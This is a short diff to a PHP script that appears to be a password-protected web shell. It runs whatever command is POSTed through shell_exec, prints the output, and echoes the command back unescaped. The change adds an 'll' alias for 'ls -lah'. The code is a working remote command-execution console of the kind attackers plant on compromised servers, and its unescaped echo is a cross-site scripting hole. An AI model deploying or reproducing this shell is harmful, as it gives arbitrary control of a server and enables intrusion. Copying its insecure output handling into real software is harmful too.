@@ -37,13 +37,14 @@ if ($_SESSION['password'] == true){
 	<hr>
 	';
 	if (isset($_POST['command'])) 
-		{
-			$command = $_POST['command'];
-            echo "Last command used : <b style='color:red' id='lastCmd' onclick='cpLastCmd()'>$command</b>";
-            echo "<div class='COPIED' id='COPIED' name='COPIED' style='color:blue;display:none;'>Successfully copied</div>";
-			echo "<a><pre>".shell_exec($command)."</pre></a>";
-		}
-		else{echo "<p>No command specified</p>";}
+	{
+		$command = $_POST['command'];
+		if($command=='ll'){$command='ls -lah';}
+		echo "Last command used : <b style='color:red' id='lastCmd' onclick='cpLastCmd()'>$command</b>";
+		echo "<div class='COPIED' id='COPIED' name='COPIED' style='color:blue;display:none;'>Successfully copied</div>";
+		echo "<a><pre>".shell_exec($command)."</pre></a>";
+	}
+	else{echo "<p>No command specified</p>";}
 }
 else{echo "<p>Please enter the password</p>";}
 ?>
